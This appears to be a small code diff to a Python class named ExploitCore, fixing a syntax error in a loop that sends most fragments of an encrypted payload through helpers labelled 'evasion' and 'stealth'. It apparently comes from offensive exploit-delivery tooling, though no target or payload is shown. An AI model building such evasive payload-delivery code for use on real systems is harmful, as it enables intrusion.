@@ -180,7 +180,7 @@ class ExploitCore:
             fragments = self.evasion.fragment_payload(encrypted_payload)
             
             # Phase 1: Send 85% of payload
-            for frag in fragments[:int(len(fragments)*0.85]:
+            for frag in fragments[:int(len(fragments)*0.85)]:
                 if self.stop_event.is_set():
                     return False
                 self.stealth.send(conn, frag)
